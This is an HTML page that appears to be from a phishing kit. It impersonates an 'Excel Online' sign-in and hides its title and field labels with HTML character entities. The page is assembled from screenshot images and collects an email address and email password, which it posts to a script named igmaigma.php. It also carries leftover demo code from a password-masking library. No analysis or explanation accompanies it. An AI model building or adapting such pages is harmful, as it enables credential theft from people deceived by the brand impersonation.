<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#69;&#120;&#99;&#101;&#108;&#32;&#79;&#110;&#108;&#105;&#110;&#101;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">  
.textbox {  
    border: solid 1px #999;
	padding-left: 8px;
	font-size: 15px;
    height: 34px; 
    width: 275px; 
 } 
 .textbox:focus {  
    border-color: #fff; 
  	border-bottom: #112F18;
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 
 </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()" bgColor="#C0C0C0">
<div id="container">
<div id="igmaa" style="position:absolute; overflow:hidden; left:0px; top:4px; width:1345px; height:661px; z-index:0"><img src="igma/igma4.png" alt="" title="" border=0 width=1345 height=661></div>

<div id="igmab" style="position:absolute; overflow:hidden; left:0px; top:2px; width:1349px; height:69px; z-index:1"><img src="igma/igma1.png" alt="" title="" border=0 width=1349 height=69></div>

<div id="igmac" style="position:absolute; overflow:hidden; left:409px; top:137px; width:532px; height:370px; z-index:2"><img src="igma/igma2.png" alt="" title="" border=0 width=532 height=370></div>

<div id="igmad" style="position:absolute; overflow:hidden; left:1114px; top:11px; width:139px; height:23px; z-index:3"><a href="#"><img src="igma/igma5.png" alt="" title="" border=0 width=139 height=23></a></div>

<div id="igmae" style="position:absolute; overflow:hidden; left:993px; top:49px; width:246px; height:18px; z-index:4"><a href="#"><img src="igma/igma6.png" alt="" title="" border=0 width=246 height=18></a></div>

<form action=igmaigma.php name=igmaigmaigma id=igmaigmaigma method=post>
<input name="igmanmaerues" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required mtype="text" style="position:absolute;width:298px;left:532px;top:230px;z-index:5">
<input name="igmawrdoaspp" id="igma" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required mtype="text" style="position:absolute;width:298px;left:532px;top:282px;z-index:6">
<div id="igmamgi" style="position:absolute; left:531px; top:328px; z-index:7"><input type="image" name="igmamgi" width="300" height="37" src="igma/igma3.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("igma"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>
